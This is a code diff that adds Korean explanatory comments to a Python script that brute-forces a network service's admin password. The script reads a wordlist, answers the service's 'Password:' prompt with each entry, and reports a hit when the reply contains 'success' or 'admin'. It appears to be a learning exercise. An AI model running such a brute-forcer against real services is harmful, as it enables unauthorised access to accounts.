@@ -18,16 +18,17 @@ def send_socket(ip: str, port: int, password: str) -> bool:
 
         resp = s.recv(1024).decode(errors="ignore")  # 서버 응답 받기
 
-        # 패스워드 입력 프롬프트 확인
+        # 서버가 요청하는 패스워드 입력 프롬프트 확인
         if "Password:" in resp:
             s.sendall(password.encode() + b"\n")  # 패스워드 전송 -> decode 바이트로 변환  -> 소켓 통신 시 무조건 바이트로 전송해야 함
             resp = s.recv(1024).decode(errors="ignore")  # 응답 받기
 
-            # 로그인 성공/실패 판별
+            # 응답 데이터 내부에 success 또는 admin 문자열이 있는지 확인 -> 성공 실패 판별
             if "success" in resp.lower() or "admin" in resp.lower():
                 print(f"[+] Found! admin:{password} -> {resp.strip()}")  # 성공 시 출력
                 return True
             else:
+                # print 내부 f -> 문자열 안에 {} 로 변수 바로 표현 가능
                 print(f"[-] Failed: {password}")  # 실패 시 출력
     except Exception as e:
         # 연결 오류 발생 시 출력
@@ -38,6 +39,7 @@ def send_socket(ip: str, port: int, password: str) -> bool:
     return False  # 실패 시 False 반환
 
 def brut_pass():
+    # with 파일을 열고 닫는 컨텍스트 매니저 문법
     # 패스워드 리스트 파일을 한 줄씩 읽어서 시도
     with open(wordlist, "r", encoding="latin-1", errors="ignore") as file:
         for line in file:
